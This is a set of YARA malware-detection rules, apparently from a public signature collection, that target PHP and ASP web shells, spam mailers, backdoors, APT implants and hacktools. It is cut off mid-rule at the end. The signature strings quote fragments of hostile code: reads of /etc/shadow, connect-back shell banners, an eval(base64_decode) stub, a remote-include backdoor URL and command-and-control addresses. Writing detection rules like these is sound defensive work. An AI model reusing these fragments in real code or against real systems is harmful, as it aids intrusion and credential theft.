rule mwi_document: exploitdoc maldoc
{
    meta:
        description = "MWI generated document"
        author = "@Ydklijnsma"
        source = "http://blog.0x3a.com/post/117760824504/analysis-of-a-microsoft-word-intruder-sample"

      strings:
        $field_creation_tag = "{\\field{\\*\\fldinst { INCLUDEPICTURE"
        $mwistat_url = ".php?id="
        $field_closing_tag = "\\\\* MERGEFORMAT \\\\d}}{\\fldrslt}}"

    condition:
        all of them
}

rule Email_Generic_PHP_Mailer_Script
{
    meta:
        Description ="Generic rule to identify potential emails sent from hacktool mailer scripts"
        Author = "Xylitol <xylitol@temari.fr>"
        date = "2020-05-11"
        // Attempt at getting live urls of HackTool.PHP.SpyMail (kav), 
        // Script.Trojan.PHPMailer (gdata), Trojan.PHP.Mailar (Ikarus)
        // This Yara rule is meant to be run against .eml files
        // May only the challenge guide you
    strings:
 
        // Files, part of php package who can trigger the rules
        // we don't want that if we scan a mixed batch of files.
        $donotwant1 = { FE ED FA CE } // Mach-O binary (32-bit)
        $donotwant2 = { FE ED FA CF } // Mach-O binary (64-bit)
        $donotwant3 = { CE FA ED FE } // Mach-O binary (reverse byte ordering scheme, 32-bit)
        $donotwant4 = { CE FA ED FE } // Mach-O binary (reverse byte ordering scheme, 64-bit)
        $donotwant5 = { 4D 5A 50 00 02 } // Win32 Dynamic Link Library - Borland C/C++
        $donotwant6 = { 53 75 62 6A 65 63 74 3A 20 25 73 } // "Subject: %s"
       
        // Adjust to your need the list of legitimate. You may miss web sent
        // spam through this filter, but we don't need stuff we can't access
        // publicly like cpanel, Roundcube, etc...
        $legit1 = "(https://github.com/PHPMailer/PHPMailer)" // PHPMailer
        $legit2 = "(phpmailer.sourceforge.net)" // PHPMailer
        $legit3 = "X-Mailer: PHPMailer" // PHPMailer
        $legit4 = "SimpleMailInvoker.php" // Swiftmailer
        $legit5 = "X-Mailer: SMF" // Simple Machines Forum
        $legit6 = "X-Mailer: phpBB3" // phpBB3
        $legit7 = "X-Mailer: PHP/Xooit" // Xooit forum
        $legit8 = "X-Mailer: vBulletin" // vBulletin
        $legit9 = "X-Mailer: MediaWiki mailer" // MediaWiki
        $legit10 = "X-Mailer: Drupal" // Drupal
        $legit11 = "X-Mailer: osCommerce Mailer" // osCommerce
        $legit12 = "abuse@mailjet.com" // Message sent by Mailjet
        $legit13 = "class.foxycart.transaction.php" // Foxy Ecommerce
        $legit14 = "User-Agent: Roundcube Webmail" // Roundcube
        $legit15 = "User-Agent: SquirrelMail" // SquirrelMail
        $legit16 = "X-Source: /opt/cpanel/" // mail send from cpanel
        $legit17 = { 58 2D 50 48 50 2D 4F 72 69 67 69 6E 61 74 69 6E 67 2D 53 63 72 69 70 74 3A 20 [1-6] 3A 70 6F 73 74 2E 70 68 70 28 [1-6] 29 } // "X-PHP-Originating-Script: ?:post.php(?)" Might be related to cpanel.
        $legit18 = { 58 2D 50 48 50 2D 53 63 72 69 70 74 3A 20 [3-30] 2F 70 6F 73 74 2E 70 68 70 20 66 6F 72 20 } // "X-PHP-Script: ????/post.php for " Might be related to cpanel.
 
        $eml1 = "From:"
        $eml2 = "To:"
        $eml3 = "Subject:"
   
        $mailer1 = /X-PHP-Originating-Script: ([\w\.]+(.*\.php))?/
        $mailer2 = /X-PHP-Script: ([\w\.\/]+\/(.*\.php))?/
        $mailer3 = /X-PHP-Filename: (\/[\w]+\/(.*\.php))?/
        // $mailer4 = /X-Source-Args: (\/[\w]+\/(.*\.php))?/  // may lead to false positive and unwanted, up to you.
 
    condition:
        not  any of ($donotwant*) and not any of ($legit*)
        and all of ($eml*) and 2 of ($mailer*)
}

rule php_backdoor_php {
	meta:
		description = "Semi-Auto-generated  - file php-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
	strings:
		$s0 = "http://michaeldaw.org   2006"
		$s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win"
		$s3 = "coded by z0mbie"
	condition:
		1 of them
}

rule Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_php {
	meta:
		description = "Semi-Auto-generated  - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
	strings:
		$s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt"
		$s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass"
		$s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";" fullword
	condition:
		1 of them
}

rule shankar_php_php {
	meta:
		description = "Semi-Auto-generated  - file shankar.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "6eb9db6a3974e511b7951b8f7e7136bb"
	strings:
		$sAuthor = "ShAnKaR"
		$s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input"
		$s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b"
	condition:
		1 of ($s*) and $sAuthor
}

rule Casus15_php_php {
	meta:
		description = "Semi-Auto-generated  - file Casus15.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5e2ede2d1c4fa1fcc3cbfe0c005d7b13"
	strings:
		$s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na"
		$s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'"
		$s3 = "value='Calistirmak istediginiz "
	condition:
		1 of them
}

rule Tool_asp {
	meta:
		description = "Semi-Auto-generated  - file Tool.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8febea6ca6051ae5e2ad4c78f4b9c1f2"
	strings:
		$s0 = "mailto:rhfactor@antisocial.com"
		$s2 = "?raiz=root"
		$s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE"
		$s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0"
	condition:
		2 of them
}

rule NT_Addy_asp {
	meta:
		description = "Semi-Auto-generated  - file NT Addy.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "2e0d1bae844c9a8e6e351297d77a1fec"
	strings:
		$s0 = "NTDaddy v1.9 by obzerve of fux0r inc"
		$s2 = "<ERROR: THIS IS NOT A TEXT FILE>"
		$s4 = "RAW D.O.S. COMMAND INTERFACE"
	condition:
		1 of them
}

rule SimAttacker___Vrsion_1_0_0___priv8_4_My_friend_php {
	meta:
		description = "Semi-Auto-generated  - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "089ff24d978aeff2b4b2869f0c7d38a3"
	strings:
		$s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend"
		$s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
		$s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora"
	condition:
		1 of them
}

rule RemExp_asp {
	meta:
		description = "Semi-Auto-generated  - file RemExp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "aa1d8491f4e2894dbdb91eec1abc2244"
	strings:
		$s0 = "<title>Remote Explorer</title>"
		$s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi"
		$s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
	condition:
		2 of them
}

rule klasvayv_asp {
	meta:
		description = "Semi-Auto-generated  - file klasvayv.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "2b3e64bf8462fc3d008a3d1012da64ef"
	strings:
		$s1 = "set aktifklas=request.querystring(\"aktifklas\")"
		$s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>"
		$s3 = "<font color=\"#858585\">www.aventgrup.net"
		$s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT"
	condition:
		1 of them
}

rule rst_sql_php_php {
	meta:
		description = "Semi-Auto-generated  - file rst_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "0961641a4ab2b8cb4d2beca593a92010"
	strings:
		$s0 = "C:\\tmp\\dump_"
		$s1 = "RST MySQL"
		$s2 = "http://rst.void.ru"
		$s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';"
	condition:
		2 of them
}

rule uploader_php_php {
	meta:
		description = "Semi-Auto-generated  - file uploader.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "0b53b67bb3b004a8681e1458dd1895d0"
	strings:
		$s2 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
		$s3 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">" fullword
		$s4 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">" fullword
	condition:
		2 of them
}

rule telnet_pl {
	meta:
		description = "Semi-Auto-generated  - file telnet.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "dd9dba14383064e219e29396e242c1ec"
	strings:
		$s0 = "W A R N I N G: Private Server"
		$s2 = "$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   "
	condition:
		all of them
}

rule Dx_php_php {
	meta:
		description = "Semi-Auto-generated  - file Dx.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util"
		$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP"
	condition:
		1 of them
}

rule sig_2008_php_php {
	meta:
		description = "Semi-Auto-generated  - file 2008.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "3e4ba470d4c38765e4b16ed930facf2c"
	strings:
		$s0 = "Codz by angel(4ngel)"
		$s1 = "Web: http://www.4ngel.net"
		$s2 = "$admin['cookielife'] = 86400;"
		$s3 = "$errmsg = 'The file you want Downloadable was nonexistent';"
	condition:
		1 of them
}

rule Rem_View_php_php {
	meta:
		description = "Semi-Auto-generated  - file Rem View.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "29420106d9a81553ef0d1ca72b9934d9"
	strings:
		$s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\""
		$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
		$s4 ="Welcome to phpRemoteView (RemView)"
	condition:
		1 of them
}

rule aZRaiLPhp_v1_0_php {
	meta:
		description = "Semi-Auto-generated  - file aZRaiLPhp v1.0.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "26b2d3943395682e36da06ed493a3715"
	strings:
		$s0 = "azrailphp"
		$s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>"
		$s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>"
	condition:
		2 of them
}

rule Moroccan_Spamers_Ma_EditioN_By_GhOsT_php {
	meta:
		description = "Semi-Auto-generated  - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "d1b7b311a7ffffebf51437d7cd97dc65"
	strings:
		$s0 = ";$sd98=\"john.barker446@gmail.com\""
		$s1 = "print \"Sending mail to $to....... \";"
		$s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei"
	condition:
		1 of them
}

rule Reader_asp {
	meta:
		description = "Semi-Auto-generated  - file Reader.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "ad1a362e0a24c4475335e3e891a01731"
	strings:
		$s1 = "Mehdi & HolyDemon"
		$s2 = "www.infilak."
		$s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%"
	condition:
		2 of them
}

rule jspshall_jsp {
	meta:
		description = "Semi-Auto-generated  - file jspshall.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "efe0f6edaa512c4e1fdca4eeda77b7ee"
	strings:
		$s0 = "kj021320"
		$s1 = "case 'T':systemTools(out);break;"
		$s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file"
	condition:
		2 of them
}

rule connectback2_pl {
	meta:
		description = "Semi-Auto-generated  - file connectback2.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "473b7d226ea6ebaacc24504bd740822e"
	strings:
		$s0 = "#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   "
		$s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel"
		$s2 = "ConnectBack Backdoor"
	condition:
		1 of them
}

rule DefaceKeeper_0_2_php {
	meta:
		description = "Semi-Auto-generated  - file DefaceKeeper_0.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "713c54c3da3031bc614a8a55dccd7e7f"
	strings:
		$s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword
		$s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9"
		$s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center"
	condition:
		1 of them
}

rule kacak_asp {
	meta:
		description = "Semi-Auto-generated  - file kacak.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "907d95d46785db21331a0324972dda8c"
	strings:
		$s0 = "Kacak FSO 1.0"
		$s1 = "if request.querystring(\"TGH\") = \"1\" then"
		$s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style="
		$s4 = "mailto:BuqX@hotmail.com"
	condition:
		1 of them
}

rule PHP_Backdoor_Connect_pl_php {
	meta:
		description = "Semi-Auto-generated  - file PHP Backdoor Connect.pl.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "57fcd9560dac244aeaf95fd606621900"
	strings:
		$s0 = "LorD of IRAN HACKERS SABOTAGE"
		$s1 = "LorD-C0d3r-NT"
		$s2 = "echo --==Userinfo==-- ;"
	condition:
		1 of them
}

rule Antichat_Socks5_Server_php_php {
	meta:
		description = "Semi-Auto-generated  - file Antichat Socks5 Server.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "cbe9eafbc4d86842a61a54d98e5b61f1"
	strings:
		$s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword
		$s3 = "#   [+] Domain name address type"
		$s4 = "www.antichat.ru"
	condition:
		1 of them
}

rule EFSO_2_asp {
	meta:
		description = "Semi-Auto-generated  - file EFSO_2.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b5fde9682fd63415ae211d53c6bfaa4d"
	strings:
		$s0 = "Ejder was HERE"
		$s1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~"
	condition:
		2 of them
}

rule Sincap_php_php {
	meta:
		description = "Semi-Auto-generated  - file Sincap.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b68b90ff6012a103e57d141ed38a7ee9"
	strings:
		$s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');"
		$s2 = "$tampon4=$tampon3-1"
		$s3 = "@aventgrup.net"
	condition:
		2 of them
}

rule Test_php_php {
	meta:
		description = "Semi-Auto-generated  - file Test.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "77e331abd03b6915c6c6c7fe999fcb50"
	strings:
		$s0 = "$yazi = \"test\" . \"\\r\\n\";" fullword
		$s2 = "fwrite ($fp, \"$yazi\");" fullword
		$s3 = "$entry_line=\"HACKed by EntriKa\";" fullword
	condition:
		1 of them
}

rule mysql_tool_php_php {
	meta:
		description = "Semi-Auto-generated  - file mysql_tool.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5fbe4d8edeb2769eda5f4add9bab901e"
	strings:
		$s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['"
		$s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV"
		$s4 = "<div align=\"center\">The backup process has now started<br "
	condition:
		1 of them
}

rule Zehir_4_asp {
	meta:
		description = "Semi-Auto-generated  - file Zehir 4.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "7f4e12e159360743ec016273c3b9108c"
	strings:
		$s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time="
		$s4 = "<input type=submit value=\"Test Et!\" onclick=\""
	condition:
		1 of them
}

rule sh_php_php {
	meta:
		description = "Semi-Auto-generated  - file sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "330af9337ae51d0bac175ba7076d6299"
	strings:
		$s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e"
		$s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:"
	condition:
		1 of them
}

rule phpbackdoor15_php {
	meta:
		description = "Semi-Auto-generated  - file phpbackdoor15.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "0fdb401a49fc2e481e3dfd697078334b"
	strings:
		$s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na"
		$s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI"
		$s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s"
	condition:
		1 of them
}

rule sql_php_php {
	meta:
		description = "Semi-Auto-generated  - file sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8334249cbb969f2d33d678fec2b680c5"
	strings:
		$s1 = "fputs ($fp, \"# RST MySQL tools\\r\\n# Home page: http://rst.void.ru\\r\\n#"
		$s2 = "http://rst.void.ru"
		$s3 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
	condition:
		1 of them
}

rule telnet_cgi {
	meta:
		description = "Semi-Auto-generated  - file telnet.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "dee697481383052980c20c48de1598d1"
	strings:
		$s0 = "www.rohitab.com"
		$s1 = "W A R N I N G: Private Server"
		$s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie"
		$s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C"
	condition:
		1 of them
}

rule backdoorfr_php {
	meta:
		description = "Semi-Auto-generated  - file backdoorfr.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "91e4afc7444ed258640e85bcaf0fecfc"
	strings:
		$s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan"
		$s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc"
	condition:
		1 of them
}

rule aspydrv_asp {
	meta:
		description = "Semi-Auto-generated  - file aspydrv.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "1c01f8a88baee39aa1cebec644bbcb99"
		score = 60
	strings:
		$s0 = "If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))"
		$s1 = "password"
		$s2 = "session(\"shagman\")="
	condition:
		2 of them
}

rule MySQL_Web_Interface_Version_0_8_php {
	meta:
		description = "Semi-Auto-generated  - file MySQL Web Interface Version 0.8.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "36d4f34d0a22080f47bb1cb94107c60f"
	strings:
		$s0 = "SooMin Kim"
		$s1 = "http://popeye.snu.ac.kr/~smkim/mysql"
		$s2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename"
		$s3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi"
	condition:
		2 of them
}

rule HawkEye_PHP_Panel {
	meta:
		description = "Detects HawkEye Keyloggers PHP Panel"
		author = "Florian Roth"
		date = "2014/12/14"
		score = 60
	strings:
		$s0 = "$fname = $_GET['fname'];" ascii fullword
		$s1 = "$data = $_GET['data'];" ascii fullword
		$s2 = "unlink($fname);" ascii fullword
		$s3 = "echo \"Success\";" fullword ascii
	condition:
		all of ($s*) and filesize < 600
}

rule SoakSoak_Infected_Wordpress {
	meta:
		description = "Detects a SoakSoak infected Wordpress site http://goo.gl/1GzWUX"
		reference = "http://goo.gl/1GzWUX"
		author = "Florian Roth"
		date = "2014/12/15"
		score = 60
	strings:
		$s0 = "wp_enqueue_script(\"swfobject\");" ascii fullword
		$s1 = "function FuncQueueObject()" ascii fullword
		$s2 = "add_action(\"wp_enqueue_scripts\", 'FuncQueueObject');" ascii fullword
	condition:
		all of ($s*)
}

rule php_anuna
{
    meta:
        author      = "Vlad https://github.com/vlad-s"
        date        = "2016/07/18"
        description = "Catches a PHP Trojan"
    strings:
        $a = /<\?php \$[a-z]+ = '/
        $b = /\$[a-z]+=explode\(chr\(\([0-9]+[-+][0-9]+\)\)/
        $c = /\$[a-z]+=\([0-9]+[-+][0-9]+\)/
        $d = /if \(!function_exists\('[a-z]+'\)\)/
    condition:
        all of them
}

rule php_in_image
{
    meta:
        author      = "Vlad https://github.com/vlad-s"
        date        = "2016/07/18"
        description = "Finds image files w/ PHP code in images"
    strings:
        $gif = /^GIF8[79]a/
        $jfif = { ff d8 ff e? 00 10 4a 46 49 46 }
        $png = { 89 50 4e 47 0d 0a 1a 0a }

        $php_tag = "<?php"
    condition:
        (($gif at 0) or
        ($jfif at 0) or
        ($png at 0)) and

        $php_tag
}

rule ScanBox_Malware_Generic {
	meta:
		description = "Scanbox Chinese Deep Panda APT Malware http://goo.gl/MUUfjv and http://goo.gl/WXUQcP"
		author = "Florian Roth"
		reference1 = "http://goo.gl/MUUfjv"
		reference2 = "http://goo.gl/WXUQcP"
		date = "2015/02/28"
		hash1 = "8d168092d5601ebbaed24ec3caeef7454c48cf21366cd76560755eb33aff89e9"
		hash2 = "d4be6c9117db9de21138ae26d1d0c3cfb38fd7a19fa07c828731fa2ac756ef8d"
		hash3 = "3fe208273288fc4d8db1bf20078d550e321d9bc5b9ab80c93d79d2cb05cbf8c2"
	strings:
		/* Sample 1 */
		$s0 = "http://142.91.76.134/p.dat" fullword ascii
		$s1 = "HttpDump 1.1" fullword ascii
		
		/* Sample 2 */
		$s3 = "SecureInput .exe" fullword wide
		$s4 = "http://extcitrix.we11point.com/vpn/index.php?ref=1" fullword ascii
		
		/* Sample 3 */
		$s5 = "%SystemRoot%\\System32\\svchost.exe -k msupdate" fullword ascii
		$s6 = "ServiceMaix" fullword ascii		
		
		/* Certificate and Keywords */
		$x1 = "Management Support Team1" fullword ascii
		$x2 = "DTOPTOOLZ Co.,Ltd.0" fullword ascii
		$x3 = "SEOUL1" fullword ascii
	condition:
		( 1 of ($s*) and 2 of ($x*) ) or 
		( 3 of ($x*) )
}

rule CVE_2015_1674_CNGSYS {
	meta:
		description = "Detects exploits for CVE-2015-1674"
		author = "Florian Roth"
		reference = "http://www.binvul.com/viewthread.php?tid=508"
		reference2 = "https://github.com/Neo23x0/Loki/blob/master/signatures/exploit_cve_2015_1674.yar"
		date = "2015-05-14"
		hash = "af4eb2a275f6bbc2bfeef656642ede9ce04fad36"
	strings:
		$s1 = "\\Device\\CNG" fullword wide
		
		$s2 = "GetProcAddress" fullword ascii
		$s3 = "LoadLibrary" ascii
		$s4 = "KERNEL32.dll" fullword ascii
		$s5 = "ntdll.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 60KB and all of them
}

rule Havex_Trojan_PHP_Server
{
    meta:
        Author      = "Florian Roth"
        Date        = "2014/06/24"
        Description = "Detects the PHP server component of the Havex RAT"
        Reference   = "www.f-secure.com/weblog/archives/00002718.html"

    strings:
        $s1 = "havex--></body></head>"
        $s2 = "ANSWERTAG_START"
        $s3 = "PATH_BLOCKFILE"

    condition:
        all of them
}

rule apt_regin_rc5key 
{
    
    meta:
        copyright = "Kaspersky Lab"
        description = "Rule to detect Regin RC5 decryption keys"
        version = "1.0"
        last_modified = "2014-11-18"
    
    strings:
        $key1={73 23 1F 43 93 E1 9F 2F 99 0C 17 81 5C FF B4 01}
        $key2={10 19 53 2A 11 ED A3 74 3F C3 72 3F 9D 94 3D 78}

    condition:
        any of ($key*)
}

rule apt_regin_vfs 
{
    
    meta:
        copyright = "Kaspersky Lab"
        author = "Kaspersky Lab"
        description = "Rule to detect Regin VFSes"
        version = "1.0"
        last_modified = "2014-11-18"
    
    strings:
        $a1={00 02 00 08 00 08 03 F6 D7 F3 52}
        $a2={00 10 F0 FF F0 FF 11 C7 7F E8 52}
        $a3={00 04 00 10 00 10 03 C2 D3 1C 93}
        $a4={00 04 00 10 C8 00 04 C8 93 06 D8}
    
    condition:
    ($a1 at 0) or ($a2 at 0) or ($a3 at 0) or ($a4 at 0)
}

rule APT_NGO_wuaclt
{
   
   meta:
    author = "AlienVault Labs"
  
  strings:
    $a = "%%APPDATA%%\\Microsoft\\wuauclt\\wuauclt.dat"
    $b = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
    $c = "/news/show.asp?id%d=%d"
    
    $d = "%%APPDATA%%\\Microsoft\\wuauclt\\"
    $e = "0l23kj@nboxu"
    
    $f = "%%s.asp?id=%%d&Sid=%%d"
    $g = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SP Q%%d)"
    $h = "Cookies: UseID=KGIOODAOOK%%s"

  condition:
    ($a and $b and $c) or ($d and $e) or ($f and $g and $h)
}

rule CookieTools {
	meta:
		description = "Chinese Hacktool Set - file CookieTools.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b6a3727fe3d214f4fb03aa43fb2bc6fadc42c8be"
	strings:
		$s0 = "http://210.73.64.88/doorway/cgi-bin/getclientip.asp?IP=" fullword ascii
		$s2 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
		$s3 = "Connection Closed Gracefully.;Could not bind socket. Address and port are alread" wide
		$s8 = "OnGetPasswordP" fullword ascii
		$s12 = "http://www.chinesehack.org/" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 5000KB and 2 of them
}

rule dat_NaslLib {
	meta:
		description = "Chinese Hacktool Set - file NaslLib.dll"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "fb0d4263118faaeed2d68e12fab24c59953e862d"
	strings:
		$s1 = "nessus_get_socket_from_connection: fd <%d> is closed" fullword ascii
		$s2 = "[*] \"%s\" completed, %d/%d/%d/%d:%d:%d - %d/%d/%d/%d:%d:%d" fullword ascii
		$s3 = "A FsSniffer backdoor seems to be running on this port%s" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1360KB and all of them
}

rule MarathonTool_2 {
	meta:
		description = "Chinese Hacktool Set - file MarathonTool.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "75b5d25cdaa6a035981e5a33198fef0117c27c9c"
	strings:
		$s3 = "http://localhost/retomysql/pista.aspx?id_pista=1" fullword wide
		$s6 = "SELECT ASCII(SUBSTR(username,{0},1)) FROM USER_USERS" fullword wide
		$s17 = "/Blind SQL injection tool based in heavy queries" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule Dos_GetPass {
	meta:
		description = "Chinese Hacktool Set - file GetPass.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "d18d952b24110b83abd17e042f9deee679de6a1a"
	strings:
		$s0 = "GetLogonS" ascii
		$s3 = "/showthread.php?t=156643" ascii
		$s8 = "To Run As Administ" ascii
		$s18 = "EnableDebugPrivileg" fullword ascii
		$s19 = "sedebugnameValue" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 890KB and all of them
}

rule Tools_unknown {
	meta:
		description = "Chinese Hacktool Set - file unknown.exe"
		author = "Florian Roth"
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
